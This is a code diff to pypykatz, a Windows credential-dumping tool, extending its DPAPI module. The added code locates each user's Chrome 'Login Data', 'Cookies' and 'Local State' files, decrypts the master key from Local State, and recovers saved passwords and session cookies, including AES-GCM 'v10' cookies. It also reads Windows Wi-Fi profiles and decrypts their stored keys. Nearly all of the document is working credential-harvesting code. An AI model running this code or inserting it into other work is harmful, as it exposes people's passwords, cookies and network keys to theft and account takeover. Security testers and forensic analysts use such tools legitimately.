@@ -11,7 +11,11 @@ import hmac
 import hashlib
 import glob
 import sqlite3
+import base64
 from hashlib import sha1, pbkdf2_hmac
+import xml.etree.ElementTree as ET
+
+from Cryptodome.Cipher import AES as PAES
 
 from pypykatz import logger
 from pypykatz.dpapi.structures.masterkeyfile import MasterKeyFile
@@ -20,6 +24,7 @@ from pypykatz.dpapi.structures.blob import DPAPI_BLOB
 from pypykatz.dpapi.structures.vault import VAULT_VCRD, VAULT_VPOL, VAULT_VPOL_KEYS
 
 from pypykatz.crypto.unified.aes import AES
+from pypykatz.crypto.unified.aesgcm import AES_GCM
 from pypykatz.crypto.unified.common import SYMMETRIC_MODE
 from pypykatz.commons.common import UniversalEncoder
 
@@ -587,51 +592,117 @@ class DPAPI:
 	
 	@staticmethod
 	def find_chrome_database_file_offline(users_path):
-		db_paths = {}
-		user_folders = {}
+		db_paths = {} # username -> files
+		user_folders = {} # username -> folder
+		
 		for filename in glob.glob(os.path.join(users_path, '*'), recursive=False):
 			if os.path.isdir(filename):
-				user_folders[filename] = 1
+				username = ntpath.basename(filename)
+				if username not in user_folders:
+					user_folders[username] = []
+				user_folders[username].append(filename)
 				
 		for subfolder_1 in ['Local', 'Roaming', 'LocalLow']:
 			for subfolder_2 in ['', 'Google']:
-				for user_folder in user_folders:
-					db_path = os.path.join(user_folder, 'AppData', subfolder_1, subfolder_2, 'Chrome','User Data','Default','Login Data' )
-					if os.path.isfile(db_path) is True:
-						db_paths[db_path] = 1
-						logger.debug('CHROME DB FILE: %s' % db_path)
+				for username in user_folders:
+					if username not in db_paths:
+						db_paths[username] = {}
+					for user_folder in user_folders[username]:
+						db_path = os.path.join(user_folder, 'AppData', subfolder_1, subfolder_2, 'Chrome','User Data','Default','Login Data' )
+						if os.path.isfile(db_path) is True:
+							db_paths[username]['logindata'] = db_path
+							logger.debug('CHROME LOGINS DB FILE: %s' % db_path)
+
+						db_cookies_path = os.path.join(user_folder, 'AppData', subfolder_1, subfolder_2, 'Chrome','User Data','Default','Cookies' )
+						if os.path.isfile(db_cookies_path) is True:
+							db_paths[username]['cookies'] = db_cookies_path
+							logger.debug('CHROME COOKIES DB FILE: %s' % db_cookies_path)
+
+						localstate_path = os.path.join(user_folder, 'AppData', subfolder_1, subfolder_2, 'Chrome','User Data', 'Local State' )
+						if os.path.isfile(localstate_path) is True:
+							db_paths[username]['localstate'] = localstate_path
+							logger.debug('CHROME localstate FILE: %s' % localstate_path)
 				
 		return db_paths
 	
 	@staticmethod
 	def get_chrome_encrypted_secret(db_path):
-		results = []
+		results = {}
+		results['logins'] = []
+		results['cookies'] = []
+		results['localstate'] = []
+
 		try:
 			conn = sqlite3.connect(db_path)
 			cursor = conn.cursor()
 		except Exception as e:
 			logger.debug('Failed to open chrome DB file %s' % db_path)
 			return results
+		
+		if ntpath.basename(db_path).lower() == 'cookies':
+			try:
+				#totally not stolen from here https://github.com/byt3bl33d3r/chrome-decrypter/blob/master/chrome_decrypt.py
+				cursor.execute('SELECT host_key, name, path, encrypted_value FROM cookies')
+			except Exception as e:
+				logger.debug('Failed perform query on chrome DB file %s Reason: %s' % (db_path, e))
+				return results
 			
-		try:
-			#totally not stolen from here https://github.com/byt3bl33d3r/chrome-decrypter/blob/master/chrome_decrypt.py
-			cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-		except Exception as e:
-			logger.debug('Failed perform query on chrome DB file %s Reason: %s' % (db_path, e))
-			return results
-			
-		for url, user, enc_pw in cursor.fetchall():
-			results.append((url, user, enc_pw))
+			for host_key, name, path, encrypted_value in cursor.fetchall():
+				results['cookies'].append((host_key, name, path, encrypted_value))
+
+		elif ntpath.basename(db_path).lower() == 'login data':
+
+			try:
+				#totally not stolen from here https://github.com/byt3bl33d3r/chrome-decrypter/blob/master/chrome_decrypt.py
+				cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+			except Exception as e:
+				logger.debug('Failed perform query on chrome DB file %s Reason: %s' % (db_path, e))
+				return results
+				
+			for url, user, enc_pw in cursor.fetchall():
+				results['logins'].append((url, user, enc_pw))
 		
 		return results
 		
 	def decrypt_all_chrome_live(self):
-		results = []
-		for db_path in DPAPI.find_chrome_database_file_live():
-			secrets = DPAPI.get_chrome_encrypted_secret(db_path)
-			for url, user, enc_password in secrets:
-				password = self.decrypt_blob_bytes(enc_password)
-				results.append((db_path, url, user, password ))
+		results = {}
+		results['logins'] = []
+		results['cookies'] = []
+		localstate_dec = None
+
+		dbpaths = DPAPI.find_chrome_database_file_live()
+		for username in dbpaths:
+			if 'localstate' in dbpaths[username]:
+				with open(dbpaths[username]['localstate'], 'r') as f:
+					encrypted_key = json.load(f)['os_crypt']['encrypted_key']
+					encrypted_key = base64.b64decode(encrypted_key)
+				
+				localstate_dec = self.decrypt_blob_bytes(encrypted_key[5:])
+
+			if 'cookies' in dbpaths[username]:
+				secrets = DPAPI.get_chrome_encrypted_secret(dbpaths[username]['cookies'])
+				for host_key, name, path, encrypted_value in secrets['cookies']:
+					if encrypted_value.startswith(b'v10'):
+						nonce = encrypted_value[3:3+12]
+						ciphertext = encrypted_value[3+12:-16]
+						tag = encrypted_value[-16:]
+						#input(localstate_dec.hex())
+						cipher = AES_GCM(localstate_dec)
+						#cipher = PAES.new(localstate_dec, PAES.MODE_GCM, nonce=nonce)
+						dec_val = cipher.decrypt(nonce, ciphertext, tag, auth_data=b'') 
+						#input(dec_val)
+						results['cookies'].append((dbpaths[username]['cookies'], host_key, name, path, dec_val ))
+					else:
+						dec_val = self.decrypt_blob_bytes(encrypted_value)
+						results['cookies'].append((dbpaths[username]['cookies'], host_key, name, path, dec_val ))
+
+			if 'logindata' in dbpaths[username]:
+				secrets = DPAPI.get_chrome_encrypted_secret(dbpaths[username]['logindata'])
+				for url, user, enc_password in secrets['logins']:
+					password = self.decrypt_blob_bytes(enc_password)
+					results['logins'].append((dbpaths[username]['logindata'], url, user, password ))
+				
+				
 		return results
 		
 	def get_all_masterkeys_live(self):
@@ -655,8 +726,40 @@ class DPAPI:
 				logger.debug('Failed to decrypt masterkeyfile with guid: %s location: %s' % (guid, mkfiles[guid]))
 		
 		return self.masterkeys, self.backupkeys
-		
-		
+	
+	@staticmethod
+	def get_all_wifi_settings_offline(system_drive_letter):
+		wifis = []
+		for filename in glob.glob('c:\\ProgramData\\Microsoft\\Wlansvc\\Profiles\\Interfaces\\**', recursive=True):
+			if filename.endswith('.xml'):
+				wifi = {}
+				tree = ET.parse(filename)
+				root = tree.getroot()
+
+				for child in root:
+					if child.tag.endswith('}name'):
+						wifi['name'] = child.text
+					elif child.tag.endswith('}MSM'):
+						for pc in child.iter():
+							if pc.tag.endswith('}keyMaterial'):
+								wifi['enckey'] = pc.text
+						
+					
+				wifis.append(wifi)
+		return wifis
+
+	@staticmethod
+	def get_all_wifi_settings_live():
+		return DPAPI.get_all_wifi_settings_offline(DPAPI.get_windows_dir_live())
+
+	def decrypt_wifi_live(self):
+		# key is encrypted as system!!!
+		for wificonfig in DPAPI.get_all_wifi_settings_live():
+			print(wificonfig)
+			if 'enckey' in wificonfig and wificonfig['enckey'] != '':
+				wificonfig['key'] = self.decrypt_securestring_hex(wificonfig['enckey'])
+				print(wificonfig['key'])
+
 # arpparse helper
 def prepare_dpapi_live(methods = [], mkf = None, pkf = None):
 	dpapi = DPAPI()
